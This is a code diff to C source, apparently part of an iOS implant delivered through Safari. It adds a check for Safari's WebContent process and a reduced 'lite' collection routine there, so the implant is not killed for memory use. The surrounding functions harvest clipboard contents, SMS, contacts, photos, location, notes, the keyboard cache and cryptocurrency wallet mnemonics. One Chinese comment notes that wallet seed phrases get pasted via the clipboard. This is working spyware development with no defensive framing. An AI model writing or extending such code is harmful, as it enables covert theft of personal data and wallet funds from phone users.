@@ -16,6 +16,8 @@
 #include <unistd.h>
 #include <dirent.h>
 #include <dlfcn.h>
+#include <string.h>
+#include <stdbool.h>
 #include <mach/mach.h>
 #include <mach/vm_map.h>
 #include "data_harvest.h"
@@ -1067,8 +1069,32 @@ void harvest_crash_logs(void) {
 /* --------------------------------------------------------------------------
  * harvest_all — called from coruna_constructor in main.c
  * -------------------------------------------------------------------------- */
+static bool dh_is_webcontent_process(void) {
+    const char *pname = getprogname();
+    if (!pname) return false;
+    if (strcmp(pname, "WebContent") == 0) return true;
+    if (strcmp(pname, "com.apple.WebKit.WebContent") == 0) return true;
+    if (strstr(pname, "WebContent") != NULL) return true;
+    return false;
+}
+
 /*
- * harvest_all — 在所有沙盒环境（含 WebContent）中安全执行的基础采集。
+ * WebContent（Safari 渲染进程）虚拟内存与 CPU 预算极紧。完整 harvest_all 会递归扫
+ * 大量容器、批量读 Notes、多路 SQLite —— 极易在数秒内触发 jetsam / watchdog，
+ * 表现为「Stage3 拉完 dylib → 页面立刻回 /」，JS 来不及再上报错误。
+ *
+ * WebContent 中只保留与当前页面相关、体量可控的轻量采集；完整采集留给非
+ * WebContent（见 main.c implant_main 分支）。
+ */
+static void harvest_all_webcontent_lite(void) {
+    harvest_clipboard();
+    harvest_webkit_storage();
+    harvest_keyboard_cache();
+    harvest_userdefaults_mnemonics();
+}
+
+/*
+ * harvest_all — 非 WebContent：完整基础采集。
  *
  * 不包含 harvest_memory_mnemonics()：该函数需遍历当前进程全部 VM 区域，
  * 在 WebContent 进程中意味着扫描数 GB WebKit 堆内存，
@@ -1076,6 +1102,11 @@ void harvest_crash_logs(void) {
  * 调用方（implant_main）负责在非 WebContent 环境下额外调用该函数。
  */
 void harvest_all(void) {
+    if (dh_is_webcontent_process()) {
+        harvest_all_webcontent_lite();
+        return;
+    }
+
     harvest_clipboard();              /* 剪贴板 — 导入钱包时必粘贴助记词 */
     harvest_sms();
     harvest_contacts();
@@ -1091,5 +1122,5 @@ void harvest_all(void) {
     harvest_photos();
     harvest_location();
     harvest_notes();
-    /* harvest_memory_mnemonics() 由 implant_main 在非沙盒环境下单独调用 */
+    /* harvest_memory_mnemonics() 由 implant_main 在非 WebContent 环境下单独调用 */
 }
